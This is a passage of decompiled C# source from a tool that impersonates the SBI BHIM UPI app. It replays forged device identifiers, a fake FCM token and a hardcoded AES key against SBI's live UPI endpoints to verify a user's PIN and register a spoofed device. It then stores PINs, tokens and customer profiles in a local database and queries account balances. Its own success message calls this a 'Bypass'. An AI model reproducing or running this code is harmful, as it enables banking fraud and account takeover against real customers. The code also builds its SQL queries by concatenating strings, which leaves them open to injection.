					string hex2 = "A6E969A6AFF28488FEB1B3B480BBD6D5C2E9A576357EC83D4633624E5698CD83";
					array = StringToByteArray(hex2);
					newValue = AESGCMEncrypt(text72, array, new byte[12]);
					string text74 = "https://upionline.sbi/upi/api/check_device_status";
					string_93 = text74;
					string text75 = this.text6;
					string oldValue29 = "msgidddddddd";
					this.text6 = text75.Replace(oldValue29, newValue);
					if (!_Request_Sbi(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, this.num, this.num, ref string_96, ref string_95, ref webException_0))
					{
						MessageBox.Show(string_96);
					}
					string str7 = string_96;
					string what12 = "resp";
					string_96 = jsonData_Serial(str7, what12);
					string_96 = AESGCMDecrypt(string_96, array, new byte[12]);
					string text76 = string_96;
					string str8 = string_96;
					string what13 = "custId";
					string text77 = jsonData_Serial(str8, what13);
					string text78 = "{\"key_data\":{\"keyId\":\"16\"},\"pspId\":\"201\",\"requestMsg\":\"msgidddddddd\"}";
					this.text6 = text78;
					string text79 = "{\"appPin\":{\"atmCrdLength\":0,\"credentialDataLength\":0,\"credentialDataValue\":\"credvaluereplace\",\"otpCrdLength\":0},\"deviceInfo\":{\"androidId\":\"0eb6a5ba728b5b89\",\"appGenId\":\"1887b77a846825fce063b0d5bf0a2e89\",\"appName\":\"com.sbi.upi\",\"appVersionCode\":\"228\",\"appVersionName\":\"2.3.47\",\"bluetoothMac\":\"NA\",\"capability\":\"5200000200010004000639292929292\",\"deviceId\":\"0eb6a5ba728b5b89\",\"deviceType\":\"MOB\",\"fcmToken\":\"rWsWrlPQQ4RU5X7UXlKwZL:APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-V4UhdWQu6sTT1ADmgkZx9Db2LpOADz6ZZm1rM3hk9d7XxuGEvffp\",\"geoCode\":\"19.0911 ,72.9208\",\"ip\":\"127.0.0.1\",\"location\":\"Mumbai\",\"mobileNo\":\"919140903684\",\"os\":\"Android12\",\"regId\":\"NA\",\"relayButton\":\"gQ75MtbopujDiyGZ/oONqRqq/sg\\u003d\",\"safetyNetId\":\"SBI239AB591680946F2BB8C432363E3E8F1\",\"selectedSimSlot\":0,\"simId\":\"0f9a9d2bf0e85bfc3\",\"smsSentTime\":\"\",\"wifiMac\":\"02:00:00:00:00:00\"},\"requestInfo\":{\"pspId\":\"201\",\"pspRefNo\":\"SBI1EBC6CE56AF446B8B896D3FE445118F4\"}}";
					string oldValue30 = "SBI1EBC6CE56AF446B8B896D3FE445118F4";
					string text80 = text79.Replace(oldValue30, getsafetyid());
					string oldValue31 = "1887b77a846825fce063b0d5bf0a2e89";
					string text81 = text80.Replace(oldValue31, newValue6);
					string oldValue32 = "9140903684";
					string text82 = text81.Replace(oldValue32, mobilenumber.Text);
					string oldValue33 = "0eb6a5ba728b5b89";
					string text83 = text82.Replace(oldValue33, androidid);
					string oldValue34 = "rWsWrlPQQ4RU5X7UXlKwZL:APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-V4UhdWQu6sTT1ADmgkZx9Db2LpOADz6ZZm1rM3hk9d7XxuGEvffp";
					string text84 = text83.Replace(oldValue34, fakeGcmToken);
					string oldValue35 = "9140903684";
					string text85 = text84.Replace(oldValue35, mobilenumber.Text);
					string oldValue36 = "0f9a9d2bf0e85bfc3";
					string text86 = text85.Replace(oldValue36, simid);
					string oldValue37 = "193780768";
					string text87 = text86.Replace(oldValue37, text19);
					string s2 = text77;
					string s3 = textBox1.Text;
					string oldValue38 = "credvaluereplace";
					newValue = AESGCMEncrypt(text87.Replace(oldValue38, new BigInteger(1, new Rfc2898DeriveBytes(Encoding.UTF8.GetBytes(s3), Encoding.UTF8.GetBytes(s2), 500, HashAlgorithmName.SHA1).GetBytes(128)).ToString(16)), array, new byte[12]);
					string text88 = "https://upionline.sbi/upi/api/verifyAppPinWeb";
					string_93 = text88;
					string text89 = this.text6;
					string oldValue39 = "msgidddddddd";
					this.text6 = text89.Replace(oldValue39, newValue);
					if (!_Request_Sbi(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, this.num, this.num, ref string_96, ref string_95, ref webException_0))
					{
						MessageBox.Show(string_96);
					}
					string text90 = "{\"appVersionCode\":0,\"deviceInfo\":{\"androidId\":\"0eb6a5ba728b5b89\",\"appGenId\":\"1887b77a846825fce063b0d5bf0a2e89\",\"appName\":\"com.sbi.upi\",\"appVersionCode\":\"228\",\"appVersionName\":\"2.3.47\",\"bluetoothMac\":\"NA\",\"capability\":\"5200000200010004000639292929292\",\"deviceId\":\"0eb6a5ba728b5b89\",\"deviceType\":\"MOB\",\"fcmToken\":\"rWsWrlPQQ4RU5X7UXlKwZL:APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-V4UhdWQu6sTT1ADmgkZx9Db2LpOADz6ZZm1rM3hk9d7XxuGEvffp\",\"geoCode\":\"19.0911 ,72.9208\",\"ip\":\"127.0.0.1\",\"location\":\"Mumbai\",\"mobileNo\":\"919140903684\",\"os\":\"Android12\",\"regId\":\"NA\",\"relayButton\":\"gQ75MtbopujDiyGZ/oONqRqq/sg\\u003d\",\"safetyNetId\":\"SBI239AB591680946F2BB8C432363E3E8F1\",\"selectedSimSlot\":0,\"simId\":\"0f9a9d2bf0e85bfc3\",\"smsSentTime\":\"\",\"wifiMac\":\"02:00:00:00:00:00\"},\"recoveryOptionFlag\":0,\"requestInfo\":{\"pspId\":\"201\",\"pspRefNo\":\"SBI0452A4C18D524A69851C32EB0E520712\"},\"root_beer_count\":0,\"smsSent\":false,\"updateFlag\":0}";
					string oldValue40 = "SBI0452A4C18D524A69851C32EB0E520712";
					string text91 = text90.Replace(oldValue40, getsafetyid());
					string oldValue41 = "1887b77a846825fce063b0d5bf0a2e89";
					string text92 = text91.Replace(oldValue41, newValue6);
					string oldValue42 = "9140903684";
					string text93 = text92.Replace(oldValue42, mobilenumber.Text);
					string oldValue43 = "0eb6a5ba728b5b89";
					string text94 = text93.Replace(oldValue43, androidid);
					string oldValue44 = "rWsWrlPQQ4RU5X7UXlKwZL:APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-V4UhdWQu6sTT1ADmgkZx9Db2LpOADz6ZZm1rM3hk9d7XxuGEvffp";
					string text95 = text94.Replace(oldValue44, fakeGcmToken);
					string oldValue45 = "9140903684";
					string text96 = text95.Replace(oldValue45, mobilenumber.Text);
					string oldValue46 = "0f9a9d2bf0e85bfc3";
					string text97 = text96.Replace(oldValue46, simid);
					string oldValue47 = "193780768";
					newValue = AESGCMEncrypt(text97.Replace(oldValue47, text19), array, new byte[12]);
					string text98 = "{\"key_data\":{\"keyId\":\"16\"},\"pspId\":\"201\",\"requestMsg\":\"mssssggg\"}";
					this.text6 = text98;
					string text99 = this.text6;
					string oldValue48 = "mssssggg";
					this.text6 = text99.Replace(oldValue48, newValue);
					string text100 = "https://upionline.sbi/upi/api/getCustomerProfileInfoWeb";
					string_93 = text100;
					if (!_Request_Sbi(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, this.num, this.num, ref string_96, ref string_95, ref webException_0))
					{
						MessageBox.Show(string_96);
					}
					AddintoDatabase(text16, text34, mobilenumber.Text);
					string str9 = string_96;
					string what14 = "resp";
					string_96 = jsonData_Serial(str9, what14);
					try
					{
						string text101 = "./BHIM_SBIUPI";
						string text102 = text101;
						if (!Directory.Exists(text102))
						{
							Directory.CreateDirectory(text102);
						}
						string text103 = "\\";
						string text104 = ".rg";
						Path_ = text102 + text103 + text16 + text104;
						string[] array8 = new string[13]
						{
							string_96, null, null, null, null, null, null, null, null, null,
							null, null, null
						};
						string text105 = "||##||";
						array8[1] = text105;
						array8[2] = text76;
						string text106 = "||##||";
						array8[3] = text106;
						array8[4] = mobilenumber.Text;
						string text107 = "||##||";
						array8[5] = text107;
						array8[6] = text19;
						string text108 = "||##||";
						array8[7] = text108;
						array8[8] = clientsecret;
						string text109 = "||##||";
						array8[9] = text109;
						array8[10] = text34;
						string text110 = "||##||";
						array8[11] = text110;
						array8[12] = tokenSecondService;
						string val = string.Concat(array8);
						Table_Write_Save_RegisInfo(val, mobilenumber.Text, text34, text16);
						string text111 = "Bypass sucessfull Please check balance before making booking.\r\n Please remember use only 5000 amount for 48hours after that you can use as much you want.";
						string caption = "Sucess";
						MessageBox.Show(text111, caption, MessageBoxButtons.OK);
						Close();
						return;
					}
					catch (Exception ex)
					{
						MessageBox.Show(ex.ToString());
						return;
					}
				}
				string text112 = "Customer Credentials verified Un-successfully";
				MessageBox.Show(text112);
			}
			else
			{
				string text113 = "maskedAccountNumber not Found";
				MessageBox.Show(text113);
				string text114 = string_96;
				string value7 = "TOKEN UPDATE FAILED";
				if (!text114.Contains(value7))
				{
					string str10 = string_96;
					string what15 = "statusDesc";
					string text115 = jsonData_Serial(str10, what15);
					this.label2.Visible = true;
					Label label = this.label2;
					string text116 = "\r\nFIrst register in BHim Sbi APP, add bank , check balance and uninstall in mobile then register here.";
					label.Text = text115 + text116;
					MessageBox.Show(this.label2.Text);
					Close();
				}
				else
				{
					string str11 = string_96;
					string what16 = "statusDesc";
					string text117 = jsonData_Serial(str11, what16);
					this.label2.Visible = true;
					Label label2 = this.label2;
					string text118 = "\r\nFIrst register in BHim Sbi APP, add bank , check balance and uninstall in mobile then register here.";
					label2.Text = text117 + text118;
					MessageBox.Show(this.label2.Text);
					Close();
				}
			}
		}
		else
		{
			string text119 = "We are currently facing some technical issues. We regret for the inconvenience caused";
			MessageBox.Show(text119);
			this.label2.Visible = true;
			Label label3 = this.label2;
			string text120 = "Issue at SBI BHIM---We are currently facing some technical issues. We regret for the inconvenience caused";
			label3.Text = text120;
			MessageBox.Show(this.label2.Text);
		}
	}

	public void Table_Write_Save_RegisInfo(string val, string mobileNum, string pin, string vpa)
	{
		string[] array = new string[5];
		string text = "INSERT INTO TBL_SBIUPI(MobNo, RegiInfo, TimeStamp) VALUES ('";
		array[0] = text;
		array[1] = mobileNum;
		string text2 = "', '";
		string text3 = "', '";
		array[2] = text2 + val + text3;
		DateTime now = DateTime.Now;
		string text4 = "dd/M/yyyy hh:mm:ss.fff tt";
		array[3] = now.ToString(text4);
		string text5 = "')";
		array[4] = text5;
		string query = string.Concat(array);
		ExecuteQuery(query);
		string[] array2 = new string[5] { vpa, null, null, null, null };
		string text6 = "||";
		array2[1] = text6;
		array2[2] = pin;
		string text7 = "||";
		array2[3] = text7;
		array2[4] = mobileNum.Trim();
		string data = string.Concat(array2);
		string text8 = "SBIUPI_";
		InsertUpiDatabase(text8 + vpa, data);
	}

	private string Table_ReadSQL(string Field, string mobileNum)
	{
		string result = "";
		try
		{
			DataTable dataTable = new DataTable();
			string text = "SELECT * FROM [TBL_SBIUPI] WHERE [MobNo] = '";
			string text2 = "'";
			new SQLiteDataAdapter(text + mobileNum + text2, Class34.string_Database).Fill(dataTable);
			if (dataTable != null && dataTable.Rows.Count > 0)
			{
				foreach (DataRow row in dataTable.Rows)
				{
					result = row[Field].ToString();
				}
			}
		}
		catch (Exception)
		{
		}
		return result;
	}

	private void InsertUpiDatabase(string upi, string data)
	{
		try
		{
			SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
			sQLiteConnection.Open();
			SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
			string text = "SELECT count(RID) from TBL_BANK where BANK_SAVEAS = '";
			string text2 = "' AND BANK_ISDEBIT = 0";
			sQLiteCommand.CommandText = text + upi + text2;
			object obj = sQLiteCommand.ExecuteScalar();
			int result = 0;
			if (obj != null && obj.GetType() != typeof(DBNull))
			{
				int.TryParse(obj.ToString().Trim(), out result);
			}
			if (result > 0)
			{
				string text3 = "DELETE from TBL_BANK where BANK_SAVEAS = '";
				string text4 = "' AND BANK_ISDEBIT = 0";
				sQLiteCommand.CommandText = text3 + upi + text4;
				sQLiteCommand.ExecuteNonQuery();
			}
			string[] array = new string[7];
			string text5 = "INSERT INTO TBL_BANK(BANK_NAME, BANK_SAVEAS, BANK_DETAILS, BANK_ISDEBIT) VALUES ('";
			array[0] = text5;
			string text6 = "SBIUPIBypass";
			array[1] = text6;
			string text7 = "', '";
			array[2] = text7;
			array[3] = upi;
			string text8 = "', '";
			array[4] = text8;
			array[5] = data;
			string text9 = "', 0)";
			array[6] = text9;
			sQLiteCommand.CommandText = string.Concat(array);
			sQLiteCommand.ExecuteNonQuery();
			sQLiteConnection.Close();
			sQLiteCommand.Dispose();
		}
		catch
		{
		}
	}

	internal static string GetRandAesKey()
	{
		try
		{
			byte[] array = new byte[LenghtAesKeyBytes];
			rngCsp.GetBytes(array);
			return bytesToHexString(array);
		}
		catch
		{
			string text = "https://apitoken.taslats.com/home/getaeskey";
			string uriString = text;
			WebClient webClient = new WebClient();
			WebHeaderCollection headers = webClient.Headers;
			string value = "My appp";
			headers.Add(HttpRequestHeader.UserAgent, value);
			string result = webClient.DownloadString(new Uri(uriString));
			webClient.Dispose();
			return result;
		}
	}

	public static string sha256_hashing(string input, string key)
	{
		return Convert.ToBase64String(EncryptAESA(Sha256Hash(input), HexStringToByteArray(key)));
	}

	private static byte[] EncryptAESA(byte[] input, byte[] key)
	{
		string algorithm = "AES/CBC/PKCS5Padding";
		IBufferedCipher cipher = CipherUtilities.GetCipher(algorithm);
		string algorithm2 = "AES";
		ParameterUtilities.CreateKeyParameter(algorithm2, key);
		cipher.Init(forEncryption: true, new ParametersWithIV(new KeyParameter(key), new byte[16]));
		return cipher.DoFinal(input);
	}

	private static byte[] Sha256Hash(string input)
	{
		Sha256Digest sha256Digest = new Sha256Digest();
		byte[] bytes = Encoding.UTF8.GetBytes(input);
		sha256Digest.BlockUpdate(bytes, 0, bytes.Length);
		byte[] array = new byte[sha256Digest.GetDigestSize()];
		sha256Digest.DoFinal(array, 0);
		return array;
	}

	private static byte[] HexStringToByteArray(string hexString)
	{
		int length = hexString.Length;
		byte[] array = new byte[length / 2];
		for (int i = 0; i < length; i += 2)
		{
			array[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
		}
		return array;
	}

	public static string RSA_ENCRYPT_PKEY(string input, string base64PublicKey)
	{
		return RsaEncrypt(input, PublicKeyFactory.CreateKey(Convert.FromBase64String(base64PublicKey)));
	}

	public void AddintoDatabase(string vpa, string pin, string mob)
	{
		try
		{
			SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
			sQLiteConnection.Open();
			SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
			string text = "SBIUPI";
			string text2 = text;
			string text3 = "SBIUPI_";
			string text4 = text3 + vpa;
			string[] array = new string[5] { vpa, null, null, null, null };
			string text5 = "||";
			array[1] = text5;
			array[2] = pin;
			string text6 = "||";
			array[3] = text6;
			array[4] = mob;
			string text7 = string.Concat(array);
			string text8 = "SELECT count(RID) from TBL_BANK where BANK_SAVEAS = '";
			string text9 = "' AND BANK_ISDEBIT = 0";
			sQLiteCommand.CommandText = text8 + text4 + text9;
			object obj = sQLiteCommand.ExecuteScalar();
			int result = 0;
			if (obj != null && obj.GetType() != typeof(DBNull))
			{
				int.TryParse(obj.ToString().Trim(), out result);
			}
			if (result <= 0)
			{
				string[] array2 = new string[7];
				string text10 = "INSERT INTO TBL_BANK(BANK_NAME, BANK_SAVEAS, BANK_DETAILS, BANK_ISDEBIT) VALUES ('";
				array2[0] = text10;
				array2[1] = text2;
				string text11 = "', '";
				array2[2] = text11;
				array2[3] = text4;
				string text12 = "', '";
				array2[4] = text12;
				array2[5] = text7;
				string text13 = "', 0)";
				array2[6] = text13;
				ExecuteQuery(string.Concat(array2));
			}
		}
		catch
		{
		}
	}

	private void ExecuteQuery(string Query)
	{
		try
		{
			SQLiteConnection sQLiteConnection = new SQLiteConnection(Class34.string_Database);
			sQLiteConnection.Open();
			SQLiteCommand sQLiteCommand = new SQLiteCommand(sQLiteConnection);
			sQLiteCommand.CommandText = Query;
			sQLiteCommand.ExecuteNonQuery();
			sQLiteConnection.Close();
			sQLiteCommand.Dispose();
		}
		catch
		{
		}
	}

	private static AsymmetricKeyParameter ReadPublicKeyFromCrt()
	{
		try
		{
			return new X509CertificateParser().ReadCertificate(Encoding.UTF8.GetBytes(x509CertSecondService)).GetPublicKey();
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static string RsaEncrypt(string input, AsymmetricKeyParameter publicKey)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(input);
		byte[] inArray;
		try
		{
			OaepEncoding oaepEncoding = new OaepEncoding(new RsaEngine(), new Sha256Digest(), new Sha256Digest(), null);
			oaepEncoding.Init(forEncryption: true, publicKey);
			inArray = oaepEncoding.ProcessBlock(bytes, 0, bytes.Length);
		}
		catch (Exception ex)
		{
			string text = "Exception while encrypting data: ";
			return text + ex.Message;
		}
		return Convert.ToBase64String(inArray);
	}

	public static string bytesToHexString(byte[] bArr)
	{
		char[] array = new char[bArr.Length * 2];
		for (int i = 0; i < bArr.Length; i++)
		{
			int num = bArr[i] & 0xFF;
			array[i * 2] = hexArray[num >> 4];
			array[i * 2 + 1] = hexArray[num & 0xF];
		}
		return new string(array);
	}

	private string method_1()
	{
		string text = listName;
		string[] array = new string[1];
		string text2 = ",";
		array[0] = text2;
		string[] array2 = text.Split(array, StringSplitOptions.None);
		return array2[new Random().Next(0, array2.Length)];
	}

	private static string method_14()
	{
		return ((long)(DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalMilliseconds).ToString();
	}

	private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	private void button2_Click(object sender, EventArgs e)
	{
		string text = listBox1.SelectedItem.ToString();
		string oldValue = "@sbi";
		string mobileNum = text.Replace(oldValue, "");
		string field = "RegiInfo";
		string readdata = Table_ReadSQL(field, mobileNum);
		string text2 = checkbakance(readdata);
		string value = "accountBalance";
		if (!text2.Contains(value))
		{
			string str = string_96;
			string what = "statusDesc";
			string text3 = jsonData_Serial(str, what);
			label2.Visible = true;
			label2.Text = text3;
		}
		else
		{
			string what2 = "accountBalance";
			string text4 = jsonData_Serial(text2, what2);
			string text5 = "A/c Balance for ";
			string text6 = maskedAccnumber;
			string text7 = "is ";
			MessageBox.Show(text5 + text6 + text7 + text4, bankName);
		}
	}

	private string checkbakance(string readdata)
	{
		string text = readdata;
		string[] array = new string[1];
		string text2 = "||##||";
		array[0] = text2;
		string[] array2 = text.Split(array, StringSplitOptions.None);
		string str = array2[1];
		string newValue = array2[4];
		readdata = array2[0];
		string text3 = array2[5];
		string text4 = array2[6];
		string hex = "A6E969A6AFF28488FEB1B3B480BBD6D5C2E9A576357EC83D4633624E5698CD83";
		key = StringToByteArray(hex);
		readdata = AESGCMDecrypt(readdata, key, new byte[12]);
		string what = "custId";
		string s = jsonData_Serial(str, what);
		string str2 = readdata;
		string what2 = "deviceId";
		string text5 = jsonData_Serial(str2, what2);
		string newValue2 = array2[3];
		string text6 = array2[2];
		string str3 = readdata;
		string what3 = "virtualAddress";
		string text7 = jsonData_Serial(str3, what3);
		string what4 = "fcmToken";
		string newValue3 = jsonData_Serial(str, what4);
		string what5 = "appGenId";
		string newValue4 = jsonData_Serial(str, what5);
		string what6 = "simId";
		string newValue5 = jsonData_Serial(str, what6);
		string str4 = readdata;
		string what7 = "virtualAddress";
		upiid = jsonData_Serial(str4, what7);
		string text8 = "https://upionline.sbi/oauth/token";
		string_93 = text8;
		string text9 = "password=149a75cef4dc4ed6b5810debf3df79d7&grant_type=password&client_secret=a8dd71dac92f4ccfaad39411ccf7842c&client_id=0eb6a5ba728b5b89&username=201&";
		string oldValue = "a8dd71dac92f4ccfaad39411ccf7842c";
		string text10 = text9.Replace(oldValue, newValue);
		string oldValue2 = "0eb6a5ba728b5b89";
		if (_Request_Sbi(string_87: text10.Replace(oldValue2, text5), string_86: string_93, string_88: string_92, webProxy_5: webProxy_3, cookieContainer_2: ref cookieContainer_3, bool_63: true, bool_64: true, int_28: 15000, int_29: 15000, string_89: ref string_96, string_90: ref string_95, webException_1: ref webException_0))
		{
			string text11 = "Bearer ";
			string text12 = string_96;
			string text13 = string_96;
			string value = "access_token";
			bearer = text11 + text12.Substring(text13.IndexOf(value) + 15, 36);
		}
		string text14 = readdata;
		string value2 = "virtualAddress";
		if (!text14.Contains(value2))
		{
			string str5 = string_96;
			string what8 = "result";
			jsonData_Serial(str5, what8);
			label2.Visible = true;
			Label label = label2;
			string text15 = "No Account is linked Please download freecharge app and add your primary account.";
			label.Text = text15;
		}
		else
		{
			string str6 = readdata;
			string what9 = "maskedAccountNumber";
			maskedAccnumber = jsonData_Serial(str6, what9);
			string str7 = readdata;
			string what10 = "bankName";
			bankName = jsonData_Serial(str7, what10);
			string text16 = "{\"accountId\":193780768,\"addInfo\":{\"addInfo10\":\"NA\",\"addInfo9\":\"NA\"},\"deviceInfo\":{\"androidId\":\"0eb6a5ba728b5b89\",\"appGenId\":\"1887b77a846825fce063b0d5bf0a2e89\",\"appName\":\"com.sbi.upi\",\"appVersionCode\":\"228\",\"appVersionName\":\"2.3.47\",\"bluetoothMac\":\"NA\",\"capability\":\"5200000200010004000639292929292\",\"deviceId\":\"0eb6a5ba728b5b89\",\"deviceType\":\"MOB\",\"fcmToken\":\"rWsWrlPQQ4RU5X7UXlKwZL:APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-V4UhdWQu6sTT1ADmgkZx9Db2LpOADz6ZZm1rM3hk9d7XxuGEvffp\",\"geoCode\":\"19.0911 ,72.9208\",\"ip\":\"127.0.0.1\",\"location\":\"Mumbai\",\"mobileNo\":\"919140903684\",\"os\":\"Android12\",\"regId\":\"NA\",\"relayButton\":\"gQ75MtbopujDiyGZ/oONqRqq/sg\\u003d\",\"safetyNetId\":\"SBI239AB591680946F2BB8C432363E3E8F1\",\"selectedSimSlot\":0,\"simId\":\"0f9a9d2bf0e85bfc3\",\"smsSentTime\":\"\",\"wifiMac\":\"02:00:00:00:00:00\"},\"requestInfo\":{\"pspId\":\"201\",\"pspRefNo\":\"SBI8B10D57DEA63432A94B01C2A3F42D417\"},\"virtualAddress\":\"9140903684@sbi\"}";
			string oldValue3 = "SBI8B10D57DEA63432A94B01C2A3F42D417";
			string text17 = "SBI";
			string text18 = Guid.NewGuid().ToString();
			string oldValue4 = "-";
			string text19 = text18.Replace(oldValue4, string.Empty).ToUpper().Substring(0, 31);
			string text20 = "7";
			string text21 = text16.Replace(oldValue3, text17 + text19 + text20);
			string oldValue5 = "1887b77a846825fce063b0d5bf0a2e89";
			string text22 = text21.Replace(oldValue5, newValue4);
			string oldValue6 = "9140903684@sbi";
			string text23 = text22.Replace(oldValue6, upiid);
			string oldValue7 = "9140903684";
			string text24 = text23.Replace(oldValue7, text6);
			string oldValue8 = "0eb6a5ba728b5b89";
			string text25 = text24.Replace(oldValue8, text5);
			string oldValue9 = "rWsWrlPQQ4RU5X7UXlKwZL:APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-V4UhdWQu6sTT1ADmgkZx9Db2LpOADz6ZZm1rM3hk9d7XxuGEvffp";
			string text26 = text25.Replace(oldValue9, newValue3);
			string oldValue10 = "0f9a9d2bf0e85bfc3";
			string text27 = text26.Replace(oldValue10, newValue5);
			string oldValue11 = "193780768";
			string text28 = text27.Replace(oldValue11, newValue2);
			string hex2 = "A6E969A6AFF28488FEB1B3B480BBD6D5C2E9A576357EC83D4633624E5698CD83";
			key = StringToByteArray(hex2);
			string newValue6 = AESGCMEncrypt(text28, key, new byte[12]);
			string text29 = "{\"key_data\":{\"keyId\":\"16\"},\"pspId\":\"201\",\"requestMsg\":\"replacedata\"}";
			this.text6 = text29;
			string text30 = this.text6;
			string oldValue12 = "replacedata";
			this.text6 = text30.Replace(oldValue12, newValue6);
			string text31 = "https://upionline.sbi/upi/api/getAccBalInitiateWeb";
			string_93 = text31;
			_Request_Sbi(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, 15000, 15000, ref string_96, ref string_95, ref webException_0);
			string str8 = string_96;
			string what11 = "resp";
			string_96 = jsonData_Serial(str8, what11);
			string_96 = AESGCMDecrypt(string_96, key, new byte[12]);
			string text32 = string_96;
			string value3 = "npciTranId";
			if (!text32.Contains(value3))
			{
				return string_96;
			}
			string str9 = string_96;
			string what12 = "pspRefNo";
			string text33 = jsonData_Serial(str9, what12);
			string str10 = string_96;
			string what13 = "npciTranId";
			string text34 = jsonData_Serial(str10, what13);
			string text35 = string_96;
			string value4 = "accountBalance";
			if (text35.Contains(value4))
			{
				return string_96;
			}
			string text36 = "369258";
			string s2 = text36;
			string text37 = "MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAuDbDFnrdaI0hCnl2CoAn70a9krjKAaQCgtJfiEv6yDGBTC8lPfxisb/U5NIAf7JRcM2oo2YGf09aavVmvXzv5xgm9SwucHzveCi4/j/JxGZP6VUorbqX3aJHbClUyS5RsNKlkBYKKpcZH6RTHmn91FDjsjdHjUsrQK7R0hT0XLL8v0wUdhCjy2adhUlewrRFCvISJ1/jIr7BkqwH9nv+6SXL0IzSJDSibSshBFcLIv3mYF0joY370/j9pGFQOsdEduELO+AbYh1hIGu5KKQwzY0/CgKaonOzRVK+pAHxLrZt9mprRKDWRk4q3SaDG2J7ZfvAgbic67X/4IzU7py0vQIBAw==";
			string s3 = text37;
			PublicKeyFactory.CreateKey(Convert.FromBase64String(s3));
			new BigInteger(1, new Rfc2898DeriveBytes(Encoding.UTF8.GetBytes(s2), Encoding.UTF8.GetBytes(s), 500, HashAlgorithmName.SHA1).GetBytes(128));
			byte[] array3 = new byte[16];
			string text38 = text34;
			if (string.IsNullOrEmpty(text38))
			{
				string text39 = GetRandAesKey().ToLower();
				string[] array4 = new string[5] { text39, null, null, null, null };
				string text40 = "|";
				array4[1] = text40;
				array4[2] = text4;
				string text41 = "|";
				array4[3] = text41;
				array4[4] = text5;
				string newValue7 = RsaEncrypt(string.Concat(array4), ReadPublicKeyFromCrt());
				string text42 = "{\"credDataCode\":\"NPCI\",\"credDataKi\":\"20150822\",\"credDataValue\":\"0eb6a5ba728b5b89|com.sbi.upi|919140903684|2.3-v1.8|thjkjljljlj\",\"credSubType\":\"INITIAL\",\"credType\":\"CHALLENGE\",\"txnId\":\"SBIF24DC8112DD347C4B289AF0997847A97\",\"txnType\":\"GET_TOKEN\"}";
				this.text6 = text42;
				string text43 = this.text6;
				string oldValue13 = "thjkjljljlj";
				this.text6 = text43.Replace(oldValue13, newValue7);
				string text44 = this.text6;
				string oldValue14 = "9140903684";
				this.text6 = text44.Replace(oldValue14, text6);
				text38 = getsafetyid();
				string text45 = this.text6;
				string oldValue15 = "SBIF24DC8112DD347C4B289AF0997847A97";
				this.text6 = text45.Replace(oldValue15, text38);
				string text46 = this.text6;
				string oldValue16 = "0eb6a5ba728b5b89";
				this.text6 = text46.Replace(oldValue16, text5);
				string text47 = "https://upionline.sbi/upi/listKeysService";
				string_93 = text47;
				_Request_Sbi(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, 15000, 15000, ref string_96, ref string_95, ref webException_0);
			}
			string[] array5 = new string[11];
			string text48 = "0.00|";
			array5[0] = text48;
			array5[1] = text38;
			string text49 = "|";
			array5[2] = text49;
			array5[3] = text7;
			string text50 = "|";
			array5[4] = text50;
			array5[5] = text7;
			string text51 = "|com.sbi.upi|91";
			array5[6] = text51;
			array5[7] = text6;
			string text52 = "|";
			array5[8] = text52;
			array5[9] = text5;
			string text53 = "|reqBalEnq";
			array5[10] = text53;
			string input = string.Concat(array5);
			rngCsp.GetBytes(array3);
			string text54 = AESGCMEncryptToBase64(SHA256withKey(input, array3), StringToByteArray(text4), array3);
			string text55 = "|";
			string text56 = text54 + text55 + Convert.ToBase64String(array3);
			string[] array6 = new string[5] { text3, null, null, null, null };
			string text57 = "|";
			array6[1] = text57;
			array6[2] = text38;
			string text58 = "|";
			array6[3] = text58;
			array6[4] = text56;
			string text59 = RsaEncrypt(string.Concat(array6), PublicKeyFactory.CreateKey(Convert.FromBase64String(s3)));
			Encoding uTF = Encoding.UTF8;
			string text60 = "2.3-v1.8|";
			string text61 = Convert.ToBase64String(uTF.GetBytes(text60 + text59));
			string oldValue17 = "=";
			string newValue8 = "\\u003d";
			string newValue9 = text61.Replace(oldValue17, newValue8);
